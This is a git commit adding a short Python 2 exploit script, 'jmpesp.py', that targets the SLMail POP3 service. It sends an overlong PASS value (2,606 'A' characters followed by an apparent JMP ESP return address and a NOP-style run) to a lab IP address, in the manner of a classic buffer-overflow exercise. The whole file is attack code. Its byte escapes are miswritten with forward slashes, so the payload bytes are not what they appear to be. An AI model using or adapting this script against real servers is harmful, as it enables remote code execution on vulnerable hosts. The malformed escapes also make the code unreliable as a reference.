9a0c98905a057ec4af0c00275c3bed1519f74a6b
Rajib Bardhan <60964983+rajibbardhan007@users.noreply.github.com>
2020-08-03 11:13:32 +0530

    Add files via upload

---
+++ SLMail/jmpesp.py
@@ -0,0 +1,29 @@
+import struct
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buff = "A" * 2606 + "/x8f/x35/x4a/x5f" + "/x90" * 30
+
+try:
+
+	print "\nSending evil buffer..."
+
+	s.connect(('192.168.1.8',110))
+
+	data = s.recv(1024)
+
+	s.send('USER username' +'\r\n')
+
+	data = s.recv(1024)
+
+	s.send('PASS ' + buff + '\r\n')
+
+	data = s.recv(1024)
+
+	s.close()
+
+except:
+
+	print "Could not connect to POP3!"
